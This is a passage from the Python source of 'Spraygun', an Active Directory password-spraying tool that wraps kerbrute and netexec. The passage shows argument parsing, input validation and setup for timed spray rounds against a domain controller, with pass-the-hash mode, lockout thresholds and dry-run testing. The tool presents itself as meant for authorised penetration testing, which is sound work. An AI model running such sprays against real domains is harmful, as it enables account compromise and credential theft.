    parser.add_argument("-d", help="Domain", required=True)
    parser.add_argument("-dc-ip", help="Domain Controller IP", required=True)

    parser.add_argument("--tool", choices=["kerbrute", "nxc"], default="kerbrute", help="Spray engine (default: kerbrute)")
    parser.add_argument("--protocol", choices=["smb", "ldap"], default="ldap", help="Protocol for nxc (default: ldap; ignored for kerbrute)")

    parser.add_argument("-t", type=int, default=35, help="Minutes between spray rounds (default: 35)")
    parser.add_argument("--limit", type=int, default=2, dest="passwords_per_round", help="Passwords per round (default: 2)")

    parser.add_argument("--pth", action="store_true", help="Pass-the-hash mode: -p file contains NTLM hashes, forces nxc, excludes kerbrute")

    parser.add_argument("--lockout-threshold", type=int, default=2, help="Cumulative lockouts before interactive prompt (default: 2)")
    parser.add_argument("--lockout-burst", type=int, default=5, help="Lockouts in a single round that hard-stop the run (default: 5)")
    parser.add_argument("--conn-fail-limit", type=int, default=10, help="Connection failures before aborting an engine (default: 10)")

    parser.add_argument("--nxc-path", help="Override path to nxc/netexec binary")
    parser.add_argument("--kerbrute-path", help="Override path to kerbrute binary")

    parser.add_argument("--resume", action="store_true", help="Resume from saved state")
    parser.add_argument("--dry-run", action="store_true", help="Emit fake tool output; no real sprays (for testing)")
    parser.add_argument("--no-preflight", action="store_true", help="Skip DC/domain preflight check")
    parser.add_argument("--log-dir", default="./spraygun-out", help="Output/state directory (default: ./spraygun-out)")

    args = parser.parse_args()

    # Validate inputs
    if not os.path.isfile(args.u):
        console.print(f"[!] Userfile not found: {args.u}", style="red")
        sys.exit(1)

    if not os.path.isfile(args.p):
        console.print(f"[!] Password/hash file not found: {args.p}", style="red")
        sys.exit(1)

    # Warn about PTH + kerbrute incompatibility
    if args.pth and args.tool == "kerbrute":
        console.print("[!] PTH mode requires --tool nxc (kerbrute cannot do pass-the-hash). Forcing nxc.", style="yellow")
        args.tool = "nxc"

    # Resolve binaries (skip for --dry-run)
    nxc_bin = args.nxc_path or shutil.which("nxc") or shutil.which("netexec") or ""
    kerbrute_bin = args.kerbrute_path or shutil.which("kerbrute") or ""

    if not args.dry_run:
        if args.tool == "nxc" and not nxc_bin:
            console.print("[!] nxc/netexec not found. Install: https://www.netexec.wiki/ or use --dry-run", style="red")
            sys.exit(1)

        if args.tool == "kerbrute" and not kerbrute_bin:
            console.print("[!] kerbrute not found. Install: https://github.com/ropnop/kerbrute or use --dry-run", style="red")
            sys.exit(1)

    # Build Config
    cfg = Config(
        userfile=args.u,
        passfile=args.p,
        domain=args.d,
        dc_ip=args.dc_ip,
        tool=args.tool,
        protocol=args.protocol,
        time_between_rounds=args.t,
        passwords_per_round=args.passwords_per_round,
        pth_mode=args.pth,
        lockout_threshold=args.lockout_threshold,
        lockout_burst=args.lockout_burst,
        conn_fail_limit=args.conn_fail_limit,
        nxc_path=args.nxc_path,
        kerbrute_path=args.kerbrute_path,
        resume=args.resume,
        dry_run=args.dry_run,
        no_preflight=args.no_preflight,
        log_dir=args.log_dir,
        nxc_binary=nxc_bin,
        kerbrute_binary=kerbrute_bin,
    )

    # Load users and passwords
    with open(args.u, "r") as f:
        cfg.users = [line.strip() for line in f if line.strip()]

    with open(args.p, "r") as f:
        cfg.passwords = [line.strip() for line in f if line.strip()]

    if not cfg.users:
        console.print("[!] No users found in userfile", style="red")
        sys.exit(1)

    if not cfg.passwords:
        console.print("[!] No passwords/hashes found in password file", style="red")
        sys.exit(1)

    # Author note
    console.print("[*] Spraygun — for authorized penetration testing only", style="dim")
    console.print(f"[*] Loaded {len(cfg.users)} users, {len(cfg.passwords)} secrets", style="cyan")

    # Run
    try:
        run(cfg, console)
    except Exception as e:
        console.print(f"[!] Fatal error: {e}", style="red")
        import traceback
        console.print(traceback.format_exc(), style="dim")
        sys.exit(1)

if __name__ == "__main__":
    main()
